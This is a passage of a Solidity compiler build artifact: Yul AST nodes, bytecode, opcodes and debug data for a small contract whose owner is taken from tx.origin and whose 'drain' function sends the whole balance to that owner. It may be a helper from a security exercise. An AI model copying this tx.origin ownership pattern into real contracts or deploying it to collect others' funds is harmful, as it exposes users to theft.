																		"src": "1090:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1080:6:1",
																			"nodeType": "YulTypedName",
																			"src": "1080:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1105:74:1",
																	"nodeType": "YulAssignment",
																	"src": "1105:74:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1151:9:1",
																						"nodeType": "YulIdentifier",
																						"src": "1151:9:1"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1162:6:1",
																						"nodeType": "YulIdentifier",
																						"src": "1162:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1147:3:1",
																					"nodeType": "YulIdentifier",
																					"src": "1147:3:1"
																				},
																				"nativeSrc": "1147:22:1",
																				"nodeType": "YulFunctionCall",
																				"src": "1147:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1171:7:1",
																				"nodeType": "YulIdentifier",
																				"src": "1171:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address_fromMemory",
																			"nativeSrc": "1115:31:1",
																			"nodeType": "YulIdentifier",
																			"src": "1115:31:1"
																		},
																		"nativeSrc": "1115:64:1",
																		"nodeType": "YulFunctionCall",
																		"src": "1115:64:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "1105:6:1",
																			"nodeType": "YulIdentifier",
																			"src": "1105:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address_fromMemory",
												"nativeSrc": "845:351:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "892:9:1",
														"nodeType": "YulTypedName",
														"src": "892:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "903:7:1",
														"nodeType": "YulTypedName",
														"src": "903:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "915:6:1",
														"nodeType": "YulTypedName",
														"src": "915:6:1",
														"type": ""
													}
												],
												"src": "845:351:1"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "608060405234801561000f575f5ffd5b506040516103a13803806103a1833981810160405281019061003191906100d4565b325f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506100ff565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b6100b381610099565b81146100bd575f5ffd5b50565b5f815190506100ce816100aa565b92915050565b5f602082840312156100e9576100e8610076565b5b5f6100f6848285016100c0565b91505092915050565b6102958061010c5f395ff3fe60806040526004361061002c575f3560e01c80638da5cb5b146100375780639890220b1461006157610033565b3661003357005b5f5ffd5b348015610042575f5ffd5b5061004b610077565b60405161005891906101ce565b60405180910390f35b34801561006c575f5ffd5b5061007561009b565b005b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610129576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161012090610241565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc4790811502906040515f60405180830381858888f1935050505015801561018c573d5f5f3e3d5ffd5b50565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6101b88261018f565b9050919050565b6101c8816101ae565b82525050565b5f6020820190506101e15f8301846101bf565b92915050565b5f82825260208201905092915050565b7f4e6f74206f776e657200000000000000000000000000000000000000000000005f82015250565b5f61022b6009836101e7565b9150610236826101f7565b602082019050919050565b5f6020820190508181035f8301526102588161021f565b905091905056fea26469706673582212200bcd705f5e39d431af854077a13b6884957db480ab8cd6ca4f464d92fb26577d64736f6c634300081d0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x3A1 CODESIZE SUB DUP1 PUSH2 0x3A1 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xD4 JUMP JUMPDEST ORIGIN PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0xFF JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB3 DUP2 PUSH2 0x99 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xCE DUP2 PUSH2 0xAA JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE9 JUMPI PUSH2 0xE8 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0xF6 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x295 DUP1 PUSH2 0x10C PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2C JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x37 JUMPI DUP1 PUSH4 0x9890220B EQ PUSH2 0x61 JUMPI PUSH2 0x33 JUMP JUMPDEST CALLDATASIZE PUSH2 0x33 JUMPI STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x42 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x4B PUSH2 0x77 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x58 SWAP2 SWAP1 PUSH2 0x1CE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x6C JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x75 PUSH2 0x9B JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x129 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x120 SWAP1 PUSH2 0x241 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC SELFBALANCE SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x18C JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1B8 DUP3 PUSH2 0x18F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1C8 DUP2 PUSH2 0x1AE JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1E1 PUSH0 DUP4 ADD DUP5 PUSH2 0x1BF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E6F74206F776E65720000000000000000000000000000000000000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x22B PUSH1 0x9 DUP4 PUSH2 0x1E7 JUMP JUMPDEST SWAP2 POP PUSH2 0x236 DUP3 PUSH2 0x1F7 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x258 DUP2 PUSH2 0x21F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SIGNEXTEND 0xCD PUSH17 0x5F5E39D431AF854077A13B6884957DB480 0xAB DUP13 0xD6 0xCA 0x4F CHAINID 0x4D SWAP3 EXTSTATICCALL 0x26 JUMPI PUSH30 0x64736F6C634300081D003300000000000000000000000000000000000000 ",
							"sourceMap": "0:397:0:-:0;;;58:156;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;189:9;181:5;;:17;;;;;;;;;;;;;;;;;;58:156;0:397;;88:117:1;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;0:397:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_43": {
									"entryPoint": null,
									"id": 43,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@drain_39": {
									"entryPoint": 155,
									"id": 39,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@owner_2": {
									"entryPoint": 119,
									"id": 2,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 447,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_stringliteral_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682_to_t_string_memory_ptr_fromStack": {
									"entryPoint": 543,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": 462,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": 577,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_string_memory_ptr_fromStack": {
									"entryPoint": 487,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 430,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 399,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"store_literal_in_memory_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682": {
									"entryPoint": 503,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:1726:1",
										"nodeType": "YulBlock",
										"src": "0:1726:1",
										"statements": [
											{
												"body": {
													"nativeSrc": "52:81:1",
													"nodeType": "YulBlock",
													"src": "52:81:1",
													"statements": [
														{
															"nativeSrc": "62:65:1",
															"nodeType": "YulAssignment",
															"src": "62:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "77:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "77:5:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "84:42:1",
																		"nodeType": "YulLiteral",
																		"src": "84:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "73:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "73:3:1"
																},
																"nativeSrc": "73:54:1",
																"nodeType": "YulFunctionCall",
																"src": "73:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "62:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "62:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "7:126:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "34:5:1",
														"nodeType": "YulTypedName",
														"src": "34:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "44:7:1",
														"nodeType": "YulTypedName",
														"src": "44:7:1",
														"type": ""
													}
												],
												"src": "7:126:1"
											},
											{
												"body": {
													"nativeSrc": "184:51:1",
													"nodeType": "YulBlock",
													"src": "184:51:1",
													"statements": [
														{
															"nativeSrc": "194:35:1",
															"nodeType": "YulAssignment",
															"src": "194:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "223:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "223:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "205:17:1",
																	"nodeType": "YulIdentifier",
																	"src": "205:17:1"
																},
																"nativeSrc": "205:24:1",
																"nodeType": "YulFunctionCall",
																"src": "205:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "194:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "194:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "139:96:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "166:5:1",
														"nodeType": "YulTypedName",
														"src": "166:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "176:7:1",
														"nodeType": "YulTypedName",
														"src": "176:7:1",
														"type": ""
													}
												],
												"src": "139:96:1"
											},
											{
												"body": {
													"nativeSrc": "306:53:1",
													"nodeType": "YulBlock",
													"src": "306:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "323:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "323:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "346:5:1",
																				"nodeType": "YulIdentifier",
																				"src": "346:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nativeSrc": "328:17:1",
																			"nodeType": "YulIdentifier",
																			"src": "328:17:1"
																		},
																		"nativeSrc": "328:24:1",
																		"nodeType": "YulFunctionCall",
																		"src": "328:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "316:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "316:6:1"
																},
																"nativeSrc": "316:37:1",
																"nodeType": "YulFunctionCall",
																"src": "316:37:1"
															},
															"nativeSrc": "316:37:1",
															"nodeType": "YulExpressionStatement",
															"src": "316:37:1"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nativeSrc": "241:118:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "294:5:1",
														"nodeType": "YulTypedName",
														"src": "294:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "301:3:1",
														"nodeType": "YulTypedName",
														"src": "301:3:1",
														"type": ""
													}
												],
												"src": "241:118:1"
											},
											{
												"body": {
													"nativeSrc": "463:124:1",
													"nodeType": "YulBlock",
													"src": "463:124:1",
													"statements": [
														{
															"nativeSrc": "473:26:1",
															"nodeType": "YulAssignment",
															"src": "473:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "485:9:1",
																		"nodeType": "YulIdentifier",
																		"src": "485:9:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "496:2:1",
																		"nodeType": "YulLiteral",
																		"src": "496:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "481:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "481:3:1"
																},
																"nativeSrc": "481:18:1",
																"nodeType": "YulFunctionCall",
																"src": "481:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "473:4:1",
																	"nodeType": "YulIdentifier",
																	"src": "473:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "553:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "553:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "566:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "566:9:1"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "577:1:1",
																				"nodeType": "YulLiteral",
																				"src": "577:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "562:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "562:3:1"
																		},
																		"nativeSrc": "562:17:1",
																		"nodeType": "YulFunctionCall",
																		"src": "562:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nativeSrc": "509:43:1",
																	"nodeType": "YulIdentifier",
																	"src": "509:43:1"
																},
																"nativeSrc": "509:71:1",
																"nodeType": "YulFunctionCall",
																"src": "509:71:1"
															},
															"nativeSrc": "509:71:1",
															"nodeType": "YulExpressionStatement",
															"src": "509:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nativeSrc": "365:222:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "435:9:1",
														"nodeType": "YulTypedName",
														"src": "435:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "447:6:1",
														"nodeType": "YulTypedName",
														"src": "447:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "458:4:1",
														"nodeType": "YulTypedName",
														"src": "458:4:1",
														"type": ""
													}
												],
												"src": "365:222:1"
											},
											{
												"body": {
													"nativeSrc": "689:73:1",
													"nodeType": "YulBlock",
													"src": "689:73:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "706:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "706:3:1"
																	},
																	{
																		"name": "length",
																		"nativeSrc": "711:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "711:6:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "699:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "699:6:1"
																},
																"nativeSrc": "699:19:1",
																"nodeType": "YulFunctionCall",
																"src": "699:19:1"
															},
															"nativeSrc": "699:19:1",
															"nodeType": "YulExpressionStatement",
															"src": "699:19:1"
														},
														{
															"nativeSrc": "727:29:1",
															"nodeType": "YulAssignment",
															"src": "727:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "746:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "746:3:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "751:4:1",
																		"nodeType": "YulLiteral",
																		"src": "751:4:1",
																		"type": "",
																		"value": "0x20"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "742:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "742:3:1"
																},
																"nativeSrc": "742:14:1",
																"nodeType": "YulFunctionCall",
																"src": "742:14:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nativeSrc": "727:11:1",
																	"nodeType": "YulIdentifier",
																	"src": "727:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
												"nativeSrc": "593:169:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nativeSrc": "661:3:1",
														"nodeType": "YulTypedName",
														"src": "661:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nativeSrc": "666:6:1",
														"nodeType": "YulTypedName",
														"src": "666:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nativeSrc": "677:11:1",
														"nodeType": "YulTypedName",
														"src": "677:11:1",
														"type": ""
													}
												],
												"src": "593:169:1"
											},
											{
												"body": {
													"nativeSrc": "874:53:1",
													"nodeType": "YulBlock",
													"src": "874:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "memPtr",
																				"nativeSrc": "896:6:1",
																				"nodeType": "YulIdentifier",
																				"src": "896:6:1"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "904:1:1",
																				"nodeType": "YulLiteral",
																				"src": "904:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "892:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "892:3:1"
																		},
																		"nativeSrc": "892:14:1",
																		"nodeType": "YulFunctionCall",
																		"src": "892:14:1"
																	},
																	{
																		"hexValue": "4e6f74206f776e6572",
																		"kind": "string",
																		"nativeSrc": "908:11:1",
																		"nodeType": "YulLiteral",
																		"src": "908:11:1",
																		"type": "",
																		"value": "Not owner"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "885:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "885:6:1"
																},
																"nativeSrc": "885:35:1",
																"nodeType": "YulFunctionCall",
																"src": "885:35:1"
															},
															"nativeSrc": "885:35:1",
															"nodeType": "YulExpressionStatement",
															"src": "885:35:1"
														}
													]
												},
												"name": "store_literal_in_memory_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682",
												"nativeSrc": "768:159:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "memPtr",
														"nativeSrc": "866:6:1",
														"nodeType": "YulTypedName",
														"src": "866:6:1",
														"type": ""
													}
												],
												"src": "768:159:1"
											},
											{
												"body": {
													"nativeSrc": "1079:219:1",
													"nodeType": "YulBlock",
													"src": "1079:219:1",
													"statements": [
														{
															"nativeSrc": "1089:73:1",
															"nodeType": "YulAssignment",
															"src": "1089:73:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "1155:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "1155:3:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1160:1:1",
																		"nodeType": "YulLiteral",
																		"src": "1160:1:1",
																		"type": "",
																		"value": "9"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
																	"nativeSrc": "1096:58:1",
																	"nodeType": "YulIdentifier",
																	"src": "1096:58:1"
																},
																"nativeSrc": "1096:66:1",
																"nodeType": "YulFunctionCall",
																"src": "1096:66:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nativeSrc": "1089:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "1089:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "1260:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "1260:3:1"
																	}
																],
																"functionName": {
																	"name": "store_literal_in_memory_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682",
																	"nativeSrc": "1171:88:1",
																	"nodeType": "YulIdentifier",
																	"src": "1171:88:1"
																},
																"nativeSrc": "1171:93:1",
																"nodeType": "YulFunctionCall",
																"src": "1171:93:1"
															},
															"nativeSrc": "1171:93:1",
															"nodeType": "YulExpressionStatement",
															"src": "1171:93:1"
														},
														{
															"nativeSrc": "1273:19:1",
															"nodeType": "YulAssignment",
															"src": "1273:19:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "1284:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "1284:3:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1289:2:1",
																		"nodeType": "YulLiteral",
																		"src": "1289:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "1280:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "1280:3:1"
																},
																"nativeSrc": "1280:12:1",
																"nodeType": "YulFunctionCall",
																"src": "1280:12:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nativeSrc": "1273:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "1273:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682_to_t_string_memory_ptr_fromStack",
												"nativeSrc": "933:365:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nativeSrc": "1067:3:1",
														"nodeType": "YulTypedName",
														"src": "1067:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nativeSrc": "1075:3:1",
														"nodeType": "YulTypedName",
														"src": "1075:3:1",
														"type": ""
													}
												],
												"src": "933:365:1"
											},
											{
												"body": {
													"nativeSrc": "1475:248:1",
													"nodeType": "YulBlock",
													"src": "1475:248:1",
													"statements": [
														{
															"nativeSrc": "1485:26:1",
															"nodeType": "YulAssignment",
															"src": "1485:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "1497:9:1",
																		"nodeType": "YulIdentifier",
																		"src": "1497:9:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1508:2:1",
																		"nodeType": "YulLiteral",
																		"src": "1508:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "1493:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "1493:3:1"
																},
																"nativeSrc": "1493:18:1",
																"nodeType": "YulFunctionCall",
																"src": "1493:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "1485:4:1",
																	"nodeType": "YulIdentifier",
																	"src": "1485:4:1"
																}
															]
														},
														{
															"expression": {
